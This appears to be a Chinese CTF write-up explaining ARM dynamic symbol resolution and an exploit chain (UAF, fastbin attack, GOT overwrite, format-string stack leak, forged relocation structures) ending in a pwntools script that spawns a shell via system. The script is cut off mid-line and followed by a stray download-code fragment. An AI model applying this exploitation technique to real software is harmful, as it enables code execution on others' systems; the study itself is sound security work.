            Elf32_Word st_name;     
            Elf32_Addr st_value;   
            Elf32_Word st_size;    
            unsigned char st_info; 
            unsigned char st_other;
            Elf32_Section st_shndx;
        } Elf32_Sym;
`st_name`是函数名相对于`strtab`的偏移，按照我们得到的结构体来说，这个数值为`0x1a`，得到的函数名字符串所在地址为`0x10334 +
0x1a = 0x1034e`，正好为`puts`
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    // 这里会检查 reloc->r_info 的低位字节是否为 0x16 (针对arm的)
这里会对`Elf32_Rel`中的`r_info`进行一个check，x86中`r_info`的低位是`0x7`而arm中这里应为`0x16`
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    // 根据 strtab + sym->st_name 处的字符串，通过 _dl_lookup_symbol_x 去加载函数，返回值是 libc的基址
这一处就是按照前面准备好的各种结构体，去加载函数，返回libc基址，调用`_dl_lookup_symbol_x`时
注意第三个参数 `&sym`，这里是`sym`变量的地址`0xf6ffed4c`，放在栈上
执行完这个函数，返回的只是libc的基址，那么我们想要调用的加载的地址在哪里呢？
其实在`_dl_lookup_symbol_x`中把`sym`的`st_value`修改成了加载函数相对于libc基址的偏移
这里提一下，在vmmap出来的地址与真实的函数偏移基址差了`0x1000`，这与x86上的情况不大一样，不知道是什么原因
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    // 得到函数真实地址
接着就利用libc基址与函数偏移得到函数真实地址
    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
    // 修改函数 GOT 表，返回真实地址
加载了函数以后，再调用就直接通过GOT表找到函数真实地址了
到此位置，arm中动态加载函数的流程已经走完了，下面针对这道题目谈谈如何利用
## 利用思路
这道题本身是一道可以任意地址读写的题目，在假设不知道libc的情况下，使用`ret to dl_resolve`应该是一个很好的办法
在以往x86上的`ret to
dl_resolve`利用，无非是栈转移到bss段再进行ROP，可是我没有发现arm上有关栈转移的操作（有些文章说arm有sp和fp寄存器，但是针对这题貌似没有发现，可能是arm的其他类型），然后我也没发现有栈溢出的地方
回归到任意地址读写的功能上，我们可以修改函数GOT表从而达到执行任意地址代码（地址确保是可执行的），找一下`gadget`
发现`__libc_csu_init`里的一个`pop`可以控制各寄存器然后跳到`pc`处，只要修改某个函数的GOT表为这个`gadget`即可
回想一下在`_dl_runtime_resolve`前，函数GOT表地址是存在`ip`寄存器的，同时`lr`寄存器指向GOT+8，所以我们可以利用这个`gadget`控制`lr`，`ip`与`pc`，从而可以自定义加载函数
那么问题就到了如何控制栈上对应位置进行`pop`，利用任意地址写是可行的，但是我们不知道栈地址
如何来leak栈地址，我在这里取巧了，通过任意地址写来修改`puts[@got](https://github.com/got
"@got")`为`printf[@plt](https://github.com/plt
"@plt")`，进而实现了格式化字符串漏洞利用，泄漏了stack，进入对栈上数据进行修改
这里要注意函数栈帧的重合，在利用时进行一次`pop`发现`edit`函数的返回地址被破坏了，于是我多进行了一次`pop`，避开了当前函数的栈帧，同时也控制了`lr`，`ip`与`pc`
剩下伪造`fake_got`，`fake_ELF32_Rel`和`fake_ELF32_Sym`了，还是利用任意地址写在bss上写下这两个结构体
`fake_got`的计算方式是`ELF JMPREL Relocation Table + (fake_got - (GOT + 8) - 4) * 2
= fake_ELF32_Rel`，所以`fake_got = (0x210b4 - 0x10494) * 2 + 0x21008 + 4 =
0x2961c`
`fake_ELF32_Rel->r_offset`是待加载函数的GOT表，这里随便填了一个`free[@got](https://github.com/got
"@got")`，不影响
`fake_ELF32_Rel->r_info`是`fake_ELF32_Sym`相对`ELF Symbol
Table`的索引，再加上架构check的`0x16`，就是`r_info = ((0x210c4 - 0x10214) >> 4) st_name`是待加载函数名相对于`ELF String
Table`的偏移，这里调用`system`，写在了bss上，于是值为`st_name = 0x210bc - 0x10334 = 0x10d88`
东西都准备好了，接着就`ret to dl_resolve`
准备进入`_dl_resolve`，此时`r0`是待调用函数的参数，`IP`是我们伪造的`fake_got`
准备进入`_dl_fixup`，`r1`是`fake_ELF32_Rel`的偏移
继续执行下去，会发现一处`SIGSEGV`，原因是读到了错误地址
看前几条指令，可以发现bypass的地方
正好这里的`r0`是`link_map`，地址存在GOT上，只需读出地址，修改`link_map +
0xe4`处为0就行了，这里的代码对应`_dl_fixup`中这一段
     if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) // 针对这个程序的利用，这里需要bypass
        {
          const ElfW(Half) *vernum =  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff; // reloc->r_offset 太大
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
绕过这一处后，就到了`_dl_lookup_symbol_x`，只要这里解析成功，剩下的就完事了
利用成功
## 完整EXP
利用流程如下
  1. UAF + Fastbin Attack 控制`notelist`
  2. 修改`puts[@got](https://github.com/got "@got")`为`printf[@plt](https://github.com/plt "@plt")`实现格式化字符串漏洞利用泄漏栈地址
  3. 读取`link_map`地址，并修改`[ink_map + 0xe4] = 0`
  4. 栈上布置`fake_ELF32_Rel`与`fake_ELF32_Sym`
  5. 修改栈上数据实现`ret to dl_resolve`
  6. Get Shell
    # encoding:utf-8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")
    e = ELF("./pwn")
    rlibc = ''
    ip = ''
    port = ''
    debug = False
    def dbg(code=""):
        global debug
        if debug == False:
            return
        gdb.debug()
    def run(local):
        global p, libc, debug
        if local == 1:
            debug = True
            # p = process(["qemu-arm", "-g", "1111", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
            p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
        else:
            p = remote(ip, port)
            debug = False
            if rlibc != '':
                libc = ELF(rlibc)
    se = lambda x: p.send(x)
    sl = lambda x: p.sendline(x)
    sea = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    rc = lambda: p.recv(timeout=0.5)
    ru = lambda x: p.recvuntil(x, drop=True)
    rn = lambda x: p.recv(x)
    shell = lambda: p.interactive()
    un64 = lambda x: u64(x.ljust(8, 'x00'))
    un32 = lambda x: u32(x.ljust(4, 'x00'))
    def add(size, c):
        sla("choice:", '1')
        sla(":", str(size))
        sea(":", c)
        #sleep(0.5)
    def delete(idx):
        sla("choice:", '2')
        sla(":", str(idx))
        #sleep(0.5)
    def show(idx):
        sla("choice:", '3')
        sla("Index :", str(idx))
    def edit(idx,c):
        sla("choice:", '5')
        sla(":", str(idx))
        sea(":", c)
        #sleep(0.5)
    note_list = 0x21088
    Sym_offset = 0x10eb
    name_offset = 0x10d88
    fake_got = 0x2961c
    gadget = 0x10b20
    fake_ELF32_Rel = ""
    fake_ELF32_Rel += p32(e.got['free'])
    fake_ELF32_Rel += p32((Sym_offset  提取码: tbci